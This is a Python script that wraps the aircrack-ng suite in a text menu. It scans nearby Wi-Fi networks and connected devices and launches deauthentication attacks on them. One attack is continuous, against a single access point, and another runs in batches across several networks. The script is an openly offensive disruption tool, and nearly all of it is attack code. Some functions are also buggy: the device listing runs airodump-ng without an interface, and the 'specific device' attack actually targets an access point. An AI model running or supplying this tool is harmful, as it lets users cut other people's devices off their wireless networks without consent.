import os
import subprocess

def start_airmon():
    subprocess.run(["airmon-ng", "start", "wlan0"])

def stop_airmon():
    subprocess.run(["airmon-ng", "stop", "wlan0mon"])

def get_wifi_list():
    # Put wlan0 into monitor mode
    start_airmon()
    # Get the new interface name (e.g. wlan0mon)
    output = subprocess.check_output(["airmon-ng"])
    interface_name = None
    for line in output.decode("utf-8").split("\n"):
        if "wlan0" in line:
            interface_name = line.split()[1]
            break
    if interface_name is None:
        print("Failed to get interface name")
        return []
    # Scan for wireless networks
    subprocess.run(["airodump-ng", "-w", "scan", "--output-format", "csv", interface_name], timeout=20)
    # Read the CSV file
    with open("scan-01.csv", "r") as f:
        wifi_list = []
        for line in f.readlines()[1:]:  # Skip the header
            wifi_list.append(line.split(",")[13].strip())
    # Stop airmon-ng
    stop_airmon()
    return wifi_list

def set_channel(channel):
    subprocess.run(["iwconfig", "wlan0mon", "channel", channel])

def deauth_attack(mac_address):
    # Get the current interface name
    output = subprocess.check_output(["airmon-ng"])
    interface_name = None
    for line in output.decode("utf-8").split("\n"):
        if "wlan0" in line:
            interface_name = line.split()[1]
            break
    if interface_name is None:
        print("Failed to get interface name")
        return
    # Perform deauth attack
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
    
def get_connected_devices():
    output = subprocess.check_output(["airodump-ng", "-w", "wlan0", "--output-format", "csv"])
    devices = []
    for line in output.decode("utf-8").split("\n"):
        if "Station" in line:
            devices.append(line.split(",")[0].strip())
    return devices

def deauth_specific_device(mac):
    subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])

def deauth_multiple_wifi(macs):
    for mac in macs:
        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])

def main():
    while True:
        print("1. Start airmon-ng")
        print("2. Stop airmon-ng")
        print("3. Get WiFi list")
        print("4. Set channel")
        print("5. Deauthenticate WiFi")
        print("6. Get connected devices")
        print("7. Deauthenticate specific device")
        print("8. Deauthenticate multiple WiFi")
        print("9. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            start_airmon()
        elif choice == "2":
            stop_airmon()
        elif choice == "3":
            wifi_list = get_wifi_list()
            print("WiFi List:")
            for i, wifi in enumerate(wifi_list):
                print(f"{i+1}. {wifi}")
        elif choice == "4":
            channel = input("Enter channel number: ")
            set_channel(channel)
  
        elif choice == "5":
            mac = input("Enter WiFi MAC address: ")
            deauth_attack(mac)
        elif choice == "6":
            devices = get_connected_devices()
            print("Connected Devices:")
            for i, device in enumerate(devices):
                print(f"{i+1}. {device}")
        elif choice == "7":
            mac = input("Enter device MAC address: ")
            deauth_specific_device(mac)
        elif choice == "8":
            macs = input("Enter multiple WiFi MAC addresses (separated by commas): ")
            macs = [mac.strip() for mac in macs.split(",")]
            deauth_multiple_wifi(macs)
        elif choice == "9":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
